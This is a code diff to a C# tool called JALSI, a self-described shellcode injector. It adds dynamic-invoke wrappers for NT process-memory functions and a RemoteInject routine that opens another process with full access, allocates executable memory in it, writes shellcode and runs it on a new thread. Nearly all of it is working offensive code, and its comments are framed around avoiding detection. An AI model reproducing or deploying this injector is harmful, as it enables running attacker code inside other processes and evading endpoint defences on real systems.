@@ -415,6 +415,44 @@ public class DInvokeCore {
         LargePages = 0x20000000
     }
 
+    [Flags]
+    public enum ProcessAccessFlags : uint
+    {
+        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396
+        PROCESS_ALL_ACCESS = 0x001F0FFF,
+        PROCESS_CREATE_PROCESS = 0x0080,
+        PROCESS_CREATE_THREAD = 0x0002,
+        PROCESS_DUP_HANDLE = 0x0040,
+        PROCESS_QUERY_INFORMATION = 0x0400,
+        PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
+        PROCESS_SET_INFORMATION = 0x0200,
+        PROCESS_SET_QUOTA = 0x0100,
+        PROCESS_SUSPEND_RESUME = 0x0800,
+        PROCESS_TERMINATE = 0x0001,
+        PROCESS_VM_OPERATION = 0x0008,
+        PROCESS_VM_READ = 0x0010,
+        PROCESS_VM_WRITE = 0x0020,
+        SYNCHRONIZE = 0x00100000
+    }
+
+    [StructLayout(LayoutKind.Sequential, Pack = 0)]
+    public struct OBJECT_ATTRIBUTES
+    {
+        public Int32 Length;
+        public IntPtr RootDirectory;
+        public IntPtr ObjectName; // -> UNICODE_STRING
+        public uint Attributes;
+        public IntPtr SecurityDescriptor;
+        public IntPtr SecurityQualityOfService;
+    }
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct CLIENT_ID
+    {
+        public IntPtr UniqueProcess;
+        public IntPtr UniqueThread;
+    }
+
     private static IntPtr GetLibraryAddress(string DLLName, string FunctionName) {
         IntPtr hModule = GetLoadedModuleAddress(DLLName);
         if (hModule == IntPtr.Zero) {
@@ -515,6 +553,30 @@ public class DInvokeCore {
             ref IntPtr RegionSize,
             UInt32 NewProtect,
             ref UInt32 OldProtect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate UInt32 NtOpenProcess(
+            ref IntPtr ProcessHandle,
+            ProcessAccessFlags DesiredAccess,
+            ref OBJECT_ATTRIBUTES ObjectAttributes,
+            ref CLIENT_ID ClientId);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate UInt32 NtAllocateVirtualMemory(
+            IntPtr ProcessHandle,
+            ref IntPtr BaseAddress,
+            IntPtr ZeroBits,
+            ref IntPtr RegionSize,
+            UInt32 AllocationType,
+            UInt32 Protect);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate UInt32 NtWriteVirtualMemory(
+            IntPtr ProcessHandle,
+            IntPtr BaseAddress,
+            IntPtr Buffer,
+            UInt32 BufferLength,
+            ref UInt32 BytesWritten);
     }
 
     public static NTSTATUS NtCreateThreadEx(
@@ -552,15 +614,118 @@ public class DInvokeCore {
         OldProtect = (UInt32)funcargs[4];
         return retValue;
     }
+
+    public static IntPtr NtOpenProcess(UInt32 ProcessId, ProcessAccessFlags DesiredAccess)
+    {
+        // Create OBJECT_ATTRIBUTES & CLIENT_ID ref's
+        IntPtr ProcessHandle = IntPtr.Zero;
+        OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
+        CLIENT_ID ci = new CLIENT_ID();
+        ci.UniqueProcess = (IntPtr)ProcessId;
+
+        // Craft an array for the arguments
+        object[] funcargs = { ProcessHandle, DesiredAccess, oa, ci };
+
+        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtOpenProcess", typeof(Delegates.NtOpenProcess), ref funcargs);
+        if (retValue != NTSTATUS.Success && retValue == NTSTATUS.InvalidCid)
+        {
+            throw new InvalidOperationException("An invalid client ID was specified.");
+        }
+        if (retValue != NTSTATUS.Success)
+        {
+            throw new UnauthorizedAccessException("Access is denied.");
+        }
+
+        // Update the modified variables
+        ProcessHandle = (IntPtr)funcargs[0];
+
+        return ProcessHandle;
+    }
+
+    public static NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, UInt32 AllocationType, UInt32 Protect) {
+        // Craft an array for the arguments
+        object[] funcargs ={ ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect };
+
+        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtAllocateVirtualMemory", typeof(Delegates.NtAllocateVirtualMemory), ref funcargs);
+        if (retValue == NTSTATUS.AccessDenied)
+        {
+            // STATUS_ACCESS_DENIED
+            throw new UnauthorizedAccessException("Access is denied.");
+        }
+        if (retValue == NTSTATUS.AlreadyCommitted)
+        {
+            // STATUS_ALREADY_COMMITTED
+            throw new InvalidOperationException("The specified address range is already committed.");
+        }
+        if (retValue == NTSTATUS.CommitmentLimit)
+        {
+            // STATUS_COMMITMENT_LIMIT
+            throw new InvalidOperationException("Your system is low on virtual memory.");
+        }
+        if (retValue == NTSTATUS.ConflictingAddresses)
+        {
+            // STATUS_CONFLICTING_ADDRESSES
+            throw new InvalidOperationException("The specified address range conflicts with the address space.");
+        }
+        if (retValue == NTSTATUS.InsufficientResources)
+        {
+            // STATUS_INSUFFICIENT_RESOURCES
+            throw new InvalidOperationException("Insufficient system resources exist to complete the API call.");
+        }
+        if (retValue == NTSTATUS.InvalidHandle)
+        {
+            // STATUS_INVALID_HANDLE
+            throw new InvalidOperationException("An invalid HANDLE was specified.");
+        }
+        if (retValue == NTSTATUS.InvalidPageProtection)
+        {
+            // STATUS_INVALID_PAGE_PROTECTION
+            throw new InvalidOperationException("The specified page protection was not valid.");
+        }
+        if (retValue == NTSTATUS.NoMemory)
+        {
+            // STATUS_NO_MEMORY
+            throw new InvalidOperationException("Not enough virtual memory or paging file quota is available to complete the specified operation.");
+        }
+        if (retValue == NTSTATUS.ObjectTypeMismatch)
+        {
+            // STATUS_OBJECT_TYPE_MISMATCH
+            throw new InvalidOperationException("There is a mismatch between the type of object that is required by the requested operation and the type of object that is specified in the request.");
+        }
+        if (retValue != NTSTATUS.Success)
+        {
+            // STATUS_PROCESS_IS_TERMINATING == 0xC000010A
+            throw new InvalidOperationException("An attempt was made to duplicate an object handle into or out of an exiting process.");
+        }
+
+        BaseAddress = (IntPtr)funcargs[1];
+        return retValue;
+    }
+
+    public static UInt32 NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, UInt32 BufferLength)
+    {
+        // Craft an array for the arguments
+        UInt32 BytesWritten = 0;
+        object[] funcargs = { ProcessHandle, BaseAddress, Buffer, BufferLength, BytesWritten };
+
+        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtWriteVirtualMemory", typeof(Delegates.NtWriteVirtualMemory), ref funcargs);
+        if (retValue != NTSTATUS.Success)
+        {
+            throw new InvalidOperationException("Failed to write memory, " + retValue);
+        }
+
+        BytesWritten = (UInt32)funcargs[4];
+        return BytesWritten;
+    }
 }
 
 public class JALSI {
-    public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+    public static UInt32 PAGE_EXECUTE_READWRITE = 0x40; // 0x40...my lovely permission...not suspicious at all ofcourse ;)
 
 	public static bool LocalInject(byte[] syelkot) {
 		// just another dope-ass banner :D
 		Console.WriteLine("[----------------------------------------------]");
-		Console.WriteLine("[JALSIv1 - Just Another Lame Sh3llc0d3 Injector]");
+		Console.WriteLine("[JALSIv2 - Just Another Lame Sh3llc0d3 Injector]");
 		Console.WriteLine("[           Written By GetRektBoy724           ]");
 		Console.WriteLine("[----------------------------------------------]");
 		Console.WriteLine("[          ----!SEQUENCE=STARTED!----          ]");
@@ -571,7 +736,7 @@ public class JALSI {
         IntPtr AllocationAddress = Marshal.AllocHGlobal((int)syelkot.Length);
 	    var updateMemSettingForAllocatedMem = DInvokeCore.NtProtectVirtualMemory(ProcessHandle, ref AllocationAddress, ref syelkotLength, 0x40, ref oldProtect);
 	    if (updateMemSettingForAllocatedMem == DInvokeCore.NTSTATUS.Success) {
-			Console.WriteLine("[*] Memory allocated at : {0} [*]", AllocationAddress.ToString("X4"));
+			Console.WriteLine("[+] Memory allocated at : {0}!", AllocationAddress.ToString("X4"));
 			Console.WriteLine("[*] Copying sh3llc0d3 at allocated memory... ");
 			// copying/planting syelkot to allocated memory
 			Marshal.Copy(syelkot, 0, AllocationAddress, syelkot.Length);
@@ -580,6 +745,7 @@ public class JALSI {
 			Marshal.Copy(AllocationAddress, CheckSyelkot, 0, syelkot.Length);
 			bool checkSyelkotAfterPlanted = CheckSyelkot.SequenceEqual(syelkot);
 			if (checkSyelkotAfterPlanted) {
+                Console.WriteLine("[+] Sh3llc0d3 planted and ready to get executed!");
 				// parameters for NtCreateThreadEx
 				IntPtr threadHandle = new IntPtr(0);
 	            DInvokeCore.ACCESS_MASK desiredAccess = DInvokeCore.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | DInvokeCore.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
@@ -592,10 +758,10 @@ public class JALSI {
 	            IntPtr pBytesBuffer = new IntPtr(0);
 	            IntPtr ZeroPointerToCheck = new IntPtr(0);
 	            // create new thread
-	            Console.WriteLine("[*] Creating new thread...");
+	            Console.WriteLine("[*] Creating new thread to execute the sh3llc0d3...");
 	            var createThreadResult = DInvokeCore.NtCreateThreadEx(ref threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
 	            if (threadHandle != ZeroPointerToCheck) {
-	            	Console.WriteLine("[*] Thread created at {0}! We're Done! [*]", threadHandle.ToString("X4"));
+	            	Console.WriteLine("[+] Thread created at {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
                     Console.WriteLine("[         ----!SEQUENCE==FINISHED!----         ]");
 	        		return true;
 	            }else {
@@ -611,4 +777,59 @@ public class JALSI {
 	    	return false;
 	    }
 	}
+
+    public static bool RemoteInject(int TargetProcessID, byte[] syelkot) {
+        // just another dope-ass banner :D
+        Console.WriteLine("[----------------------------------------------]");
+        Console.WriteLine("[JALSIv2 - Just Another Lame Sh3llc0d3 Injector]");
+        Console.WriteLine("[           Written By GetRektBoy724           ]");
+        Console.WriteLine("[----------------------------------------------]");
+        Console.WriteLine("[          ----!SEQUENCE=STARTED!----          ]");
+        IntPtr TargetProcessHandle = DInvokeCore.NtOpenProcess((UInt32)TargetProcessID, DInvokeCore.ProcessAccessFlags.PROCESS_ALL_ACCESS);
+        Console.WriteLine("[*] Got handle for PID {0} : {1}", TargetProcessID, TargetProcessHandle.ToString("X4"));
+        IntPtr AllocationAddress = new IntPtr();
+        IntPtr ZeroBitsThatZero = IntPtr.Zero;
+        IntPtr AllocationSize = new IntPtr(syelkot.Length);
+        UInt32 AllocationType = (UInt32)DInvokeCore.AllocationType.Commit | (UInt32)DInvokeCore.AllocationType.Reserve;
+        Console.WriteLine("[*] Allocating memory...");
+        var AllocationResult = DInvokeCore.NtAllocateVirtualMemory(TargetProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref AllocationSize, AllocationType, PAGE_EXECUTE_READWRITE);
+        Console.WriteLine("[+] Memory allocated at : {0}!", AllocationAddress.ToString("X4"));
+        Console.WriteLine("[*] Copying sh3llc0d3 at allocated memory... ");
+        // copying/planting syelkot to allocated memory
+        //Marshal.Copy(syelkot, 0, AllocationAddress, syelkot.Length);
+        // storing the shellcode temporarily in unmanaged memory
+        IntPtr ShellcodeInUnmanagedMem = Marshal.AllocHGlobal(syelkot.Length);
+        Marshal.Copy(syelkot, 0, ShellcodeInUnmanagedMem, syelkot.Length);
+        int shellcodesWritten = (int)DInvokeCore.NtWriteVirtualMemory(TargetProcessHandle, AllocationAddress, ShellcodeInUnmanagedMem, (UInt32)syelkot.Length);
+        // check if written bytes is as big as the shellcode
+        if (shellcodesWritten == syelkot.Length) {
+            Marshal.FreeHGlobal(ShellcodeInUnmanagedMem);
+            Console.WriteLine("[+] Sh3llc0d3 planted and ready to get executed!");
+            // parameters for NtCreateThreadEx
+            IntPtr threadHandle = new IntPtr(0);
+            DInvokeCore.ACCESS_MASK desiredAccess = DInvokeCore.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | DInvokeCore.ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
+            IntPtr pObjectAttributes = new IntPtr(0);
+            IntPtr lpParameter = new IntPtr(0);
+            bool bCreateSuspended = false;
+            int stackZeroBits = 0;
+            int sizeOfStackCommit = 0xFFFF;
+            int sizeOfStackReserve = 0xFFFF;
+            IntPtr pBytesBuffer = new IntPtr(0);
+            IntPtr ZeroPointerToCheck = new IntPtr(0);
+            // create new thread
+            Console.WriteLine("[*] Creating new thread to execute the sh3llc0d3...");
+            var createThreadResult = DInvokeCore.NtCreateThreadEx(ref threadHandle, desiredAccess, pObjectAttributes, TargetProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
+            if (threadHandle != ZeroPointerToCheck) {
+                Console.WriteLine("[+] Thread created at {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
+                Console.WriteLine("[         ----!SEQUENCE==FINISHED!----         ]");
+                return true;
+            }else {
+                Console.WriteLine("[-] Failed to create new thread with error of {0}! [-]", createThreadResult);
+                return false;
+            }
+        }else {
+            Console.WriteLine("[-] Copied shellcode is broken,cant continue! [-]");
+            return false;
+        }        
+    }
 }
